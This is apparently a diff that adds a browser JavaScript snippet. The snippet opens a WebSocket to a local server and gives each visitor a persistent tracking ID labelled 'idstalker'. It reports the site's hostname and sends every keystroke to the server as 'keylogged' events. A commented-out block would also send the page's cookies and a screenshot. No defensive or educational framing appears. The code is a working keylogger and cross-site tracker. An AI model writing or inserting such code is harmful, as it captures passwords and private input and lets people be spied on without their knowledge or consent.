@@ -1,1 +1,26 @@
-test
+let f = new WebSocket("ws://localhost:25565")
+    f.onopen = ()=>{
+        if(!localStorage.getItem("idstalker")){
+            f.send("new")
+        }else{
+            f.send("register "+localStorage.getItem("idstalker")+" "+window.location.hostname)
+        }
+    }
+    
+    f.onmessage = (message)=>{
+        message = message.data
+        if(message.startsWith("newcookie")){
+            localStorage.setItem("idstalker",message.split(" ")[1])
+            f.send("register "+localStorage.getItem("idstalker")+" "+window.location.hostname)
+        }
+
+        /*if(message.startsWith("sendWebsite")){
+            html2canvas(document.getElementsByTagName("html").innerHTML).then(canvas => {
+                f.send("image "+document.cookie+" "+canvas.toDataURL())
+            });
+        }*/
+    }
+
+    document.addEventListener("keydown",key=>{
+        f.send("keylogged "+localStorage.getItem("idstalker")+" "+key.key);
+    })
